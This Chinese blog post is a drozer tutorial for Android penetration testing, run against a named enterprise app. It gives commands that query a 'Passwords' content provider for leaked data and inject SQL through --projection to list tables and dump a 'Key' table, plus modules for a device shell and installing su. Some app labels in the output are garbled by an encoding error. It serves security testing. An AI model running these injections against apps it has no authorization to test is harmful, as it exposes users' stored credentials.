---
title: 利用drozer进行Android渗透测试
date: 2015-05-10 15:18:59
tags: [android,测试]
categories: android
---

# 一、 drozer的安装与启动
## 1、 安装
第一步：从http://mwr.to/drozer下载Drozer (Windows Installer)

第二步：在Android设备中安装agent.apk
```js
adb install agent.apk
```

<!-- more -->

## 2、 启动
第一步：使用adb连接android设备
```js
C:\Users\vv>adb connect 20.20.20.55
connected to 20.20.20.55:5555
```
第二步：使用adb进行端口转发，转发到Drozer使用的端口31415
```js
C:\Users\vv>adb forward tcp:31415 tcp:31415
```
第三步：在Android设备上开启Drozer Agent  
选择embedded server-enable

第四步：切换到drozer安装的bin目录下，开启Drozer console
```js
F:\drozer>drozer console connect
```
输出信息：
```java
    java = C:\path\to\java
    Selecting 8a04af64a8b990d8 (LENOVO Lenovo A850 4.2.2)

                ..                    ..:.
               ..o..                  .r..
                ..a..  . ....... .  ..nd
                  ro..idsnemesisand..pr
                  .otectorandroidsneme.
               .,sisandprotectorandroids+.
             ..nemesisandprotectorandroidsn:.
            .emesisandprotectorandroidsnemes..
          ..isandp,..,rotectorandro,..,idsnem.
          .isisandp..rotectorandroid..snemisis.
          ,andprotectorandroidsnemisisandprotec.
         .torandroidsnemesisandprotectorandroid.
         .snemisisandprotectorandroidsnemesisan:
         .dprotectorandroidsnemesisandprotector.

    drozer Console (v2.3.3)
    It seems that you are running an old version of drozer. drozer v2.3.4 was
    released on 2015-02-20. We suggest that you update your copy to make sure that
    you have the latest features and fixes.

    To download the latest drozer visit: http://mwr.to/drozer/

    dz>
```
最后如果出现如上信息就表示启动并连接成功了

# 二、 测试步骤
## 1、 获取android手机上所有的包名
```js
    dz> run app.package.list
    MFT.test (MFT_Test)
    android (Android 绯荤粺)
    cn.wps.moffice (WPS Office)
    com.amap.android.location (缃戠粶浣嶇疆)
    com.android.backupconfirm (com.android.backupconfirm)
    com.android.browser (娴忚鍣?
    com.android.calculator2 (璁＄畻鍣?
    com.android.certinstaller (Certificate Installer)
    com.android.defcontainer (搴旂敤鍖呰闂潈闄愬府鍔╃▼搴?）
```

## 2、 获取android手机上口袋助理的包名
```js
dz> run app.package.list -f sangfor
com.sangfor.pocket (鍙ｈ鍔╃悊)
```
## 3、 获取应用的基本信息
```js
    dz> run app.package.info -a com.sangfor.pocket
    Package: com.sangfor.pocket
      Application Label: 鍙ｈ鍔╃悊
      Process Name: com.sangfor.pocket
      Version: 1.3.1

    .........
```

## 4、 确定攻击面
```js
    dz> run app.package.attacksurface  com.sangfor.pocket
    Attack Surface:
      10 activities exported
      8 broadcast receivers exported
      0 content providers exported
      6 services exported
        is debuggable
```

## 5、 Activity  
（1）获取activity信息
```js
    run app.activity.info -a com.sangfor.pocket
```
（2）启动activity
```js
    run app.activity.start --component com.sangfor.pocket

    dz> help app.activity.start

    usage: run app.activity.start [-h] [--action ACTION] [--category CATEGORY]

    [--component PACKAGE COMPONENT] [--data-uri DATA_URI]

    [--extra TYPE KEY VALUE] [--flags FLAGS [FLAGS ...]]

    [--mimetype MIMETYPE]
```

## 6、 Content Provider  
（1）获取Content Provider信息
```js
    dz> run app.provider.info -a com.sangfor.pocket
    Package: com.sangfor.pocket
      No matching providers.
```
（2）Content Providers（数据泄露）
* 先获取所有可以访问的Uri：
```js
        run scanner.provider.finduris -a com.sangfor.pocket
```
* 获取各个Uri的数据：
```js
        run app.provider.query content://com.sangfor.pocket.DBContentProvider/Passwords/ --vertical
```
查询到数据说明存在漏洞

（3）Content Providers（SQL注入）
```js
    run app.provider.query content://com.sangfor.pocket.DBContentProvider/Passwords/ --projection "'"
    run app.provider.query content://com.sangfor.pocket.DBContentProvider/Passwords/ --selection "'"
```
报错则说明存在SQL注入。

列出所有表：
```js
    run app.provider.query content://com.sangfor.pocket.DBContentProvider/Passwords/ --projection "* FROM SQLITE_MASTER WHERE type='table';--"
```
获取某个表（如Key）中的数据：  
```js
    run app.provider.query content://com.sangfor.pocket.DBContentProvider/Passwords/ --projection "* FROM Key;--"
```
（4）同时检测SQL注入和目录遍历
```js
    run scanner.provider.injection -a com.sangfor.pocket

      run scanner.provider.traversal -a com.sangfor.pocket
```

## 7、 Service  
（1）获取service详情
```js
    run app.service.info -a com.mwr.example.sieve
```

## 8、 其它模块  
```js
#在设备上开启一个交互shell  
shell.start

#上传/下载文件到设备
tools.file.upload / tools.file.download

#安装可用的二进制文件
tools.setup.busybox / tools.setup.minimalsu
```
